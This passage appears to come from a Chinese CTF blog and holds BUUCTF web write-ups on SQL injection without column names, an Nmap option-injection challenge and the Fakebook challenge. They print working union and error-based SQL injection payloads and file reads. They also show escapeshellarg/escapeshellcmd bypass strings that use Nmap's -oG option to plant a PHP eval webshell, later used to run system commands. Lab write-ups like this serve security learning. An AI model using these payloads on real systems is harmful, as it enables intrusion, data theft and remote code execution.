users)a;<br><br>测试:<br>-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值<br>-- 爆出第3列的值,把3当作第三列的字段名<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- 爆出第1列的值，把别名a当作第一列的字段名<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>无列名爆破法测试:</p><p>第一种:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>第二种:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>根据无名列爆破的payload,我们先要确认该表有多少个字段:</p><p>（flag在users表中，所以在这里省略对ads表的判断，思路和users表一样）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>继续添加字段，（省略两个字段的判断）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>回显了第一列的所有内容，说明users表的字段有三个</p><p>回显第二个字段的内容:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>发现了flag,但是不是flag的内容，说明flag内容在第三个字段中</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[网鼎杯 2020 朱雀组]Nmap 题解</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>输入框中我们可以输入ip地址或hostname</p><p>测试:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.在kali中测试nmap:</p><p>nmap对ip地址的处理</p><p><strong>扫描IP地址:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>返回的结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>而网站中的返回结果为:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>两者的返回结果都是TCP协议，然后有Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**扫描指定IP地址(ping 扫描)**：<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>返回结果中没有表明是TCP协议</p><p>所以一般网站使用TCP返回，都是nmap扫描或nmap -sT 扫描(默认是nmap)</p><p>猜测该网址的扫描形式为:nmap “输入的ip地址”</p><p>2.nmap扫描漏洞利用:</p><p>nmap中可以用于将扫描结果写文件并输出保存在本地的命令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (标准输出)<br><br>-oX (XML输出)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grep输出)<br><br>-oA (输出至所有格式)<br></code></pre></td></tr></table></figure><p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>发现在当前文件夹中生成了一个test.txt文件</p><p>所以我们可以利用输出这个漏洞，将一句话木马写入文件中，利用该输出漏洞将一句话木马文件保存到网页的当前文件夹中，就可以实现注入</p><p>测试2:</p><p>测试网页是否可以进行输出命令的执行:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>网页成功回显，且返回的结果和测试的结果相似，说明该指令被成功执行，所以我们就可以构造注入payload</p><p>3.构造一句话木马:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>响应结果:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" alt="image-20230822105623631"></p><p>发现输入的结果可能被过滤,采用第二个payload试试<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>依然被过滤</p><p>4.现在就要一个个进行判断，寻找被过滤的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>存在黑名单内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>由于该文件不可被识别，所以就无法显示内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>所以过滤的内容为php,我们需要绕过php判断</p><p><strong>php一句话木马的构造</strong></p><p>可以解析php文件的后缀名:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>php短标签：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #前提是开启配置参数short_open_tags=on<br>&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置<br>&lt;% echo &#x27;123&#x27;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。<br></code></pre></td></tr></table></figure><p>测试:<br><? echo '123';?> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(表达式)?><p>  等价于 <?php echo (表达式)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo ‘123’;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>使用短标签绕过php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(表达式)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>测试:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>绕过</p><p>构造写文件输出payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" alt="image-20230822131843981"></p><p>发现成功绕过:<br>访问pass.phtml:</p><p>由于当于oG输出的文件都在当前文件夹下所以为:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>发现当前网站下没有该文件，从之前的[BUUCTF 2018]Online Tool中获取的经验，nmap可能和escapeshellarg()与escapeshellcmd()配合使用，需要绕过这两个函数：使用空格和单引号,为了防止’pass’的单引号也被这两个函数过滤，我们这里使用”pass”:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>访问pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>使用webshell测试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>发现一个flag文件:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>返回结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 题解</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.点击登陆界面join,申请一个用户:<br>admin,123,18,bai.com</p><p>2.登录网站后，点击admin,发现网址有注入点:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,应该是记录的编号，我们可以通过no进行注入</p><p>注册一个账户之后自动生成记录的编号，所以编号为自动递增型为int</p><p>3.随便注入no&#x3D;1’,网页响应有sql报错，所以该网页存在sql语句注入</p><p>4.猜测该网页使用了select * from where no &#x3D; </p><p>所以我们可以用1 union select 1,2,3;#</p><p>但是返回了no hacker,所以可能过滤了select</p><p>所以可以用</p><p>– 内联注释绕过<br>&#x2F;*!select *&#x2F;1，2，3，4;</p><p>5.爆字段:1 order by 4;#</p><p>当order by 5#时报错，所以最大字段数为4</p><p>6.使用-1 union&#x2F;*!select *&#x2F;1，2，3，4;</p><p>只有username返回值为2，所以只有第二个字段能够成功返回值</p><p>使用-1是为了使响应网址只返回我们select的内容</p><p>7.爆数据库:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;爆出所有数据库</p><p>uername爆出数据库为fakebook</p><p>只有一个数据库</p><p>8.爆表</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()可以直接显示当前数据库，一般是只有一个数据库才可以用，否则就要指定数据库</p><p>username字段显示users表</p><p>9.爆字段</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; ‘fakebook’ and table_name &#x3D; ‘users’;</p><p>username字段显示no,username,passwd,data字段</p><p>data字段是之前没有看到过的，所以现在要查看字段的值</p><p>10.爆字段的值</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:爆出字段值:O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>这是一个序列化语句:表示有一个UserInfo类，这个类有参数name,age,blog</p><p>没有获得有用的信息，所以查看其他几个字段的内容</p><p>11.爆其他字段:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>username爆出字段的值:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现除了no和username字段其他为密文，进行解密:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现解密失败，所以可能不是密文</p><p>12.查看网页的robots.txt文件，查看网页还允许我们查看的文件有哪些:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>获得一个user.php.bak文件，将它下载:</p><p>13.分析user.php.bak中的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfo类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//有参申请类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()函数用于初始化一个新的会话，可以用于获取网页地址、设置网页头信息等</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt — 设置一个cURL传输选项</span><br>        <span class="hljs-comment">//CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blog内容的处理</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>该代码展示了一个UserInFo的类的具体内容和参数，以便之后的序列化处理</p><p>14.由网页显示的内容得：</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>下面一块不可见区域为，我们输入的blog（博客）的内容，所以猜测如果我们输入的博客内容为flag.php,则会显示该文件的内容，但是我们要知道网站flag.php的具体文件路径</strong></p><p><strong>网页中源代码的描述这块内容:</strong><br><strong>src &#x3D; ‘data:text&#x2F;html;base64,PCF………’</strong></p><p><strong>所以data的类型是text文本型</strong></p><p>所以网页的源地址传输为data,猜测可能利用的是第四个字段data中的内容:</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>data字段中的内容是经过序列化处理的结果</p><p>15.利用报错注入获取flag.php的文件路径:</p><p>or(updatexml(1,concat(‘<del>‘,(SELECT(load_file(“flag.php”)),’</del>‘),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>通过筛选，发现网站过滤了’x’</p><p>所以用字符’<del>‘:or(updatexml(1,concat(‘</del>‘,(SELECT(load_file(“flag.php”)),’~’),1))#</p><p>返回报错内容:</p><p>[*] query error! (Incorrect parameter count in the call to native function ‘updatexml’)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>所以我们猜测flag.php的地址为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>其实，随便输入一个错误的参数都会报错显示地址&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php，所以一定要注意任何报错信息</strong></p><p>16.所以blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>所以要爆出该文件的内容:select load_file(“文件路径”);可以获取该文件的内容</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4</p><p><strong>username没有返回内容，但是页面产生了响应，说明username所显示的内容，不符合该字段所能显示的内容的格式，可以通过查看网页源代码，查看本来应该在该字段中显示的内容：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span 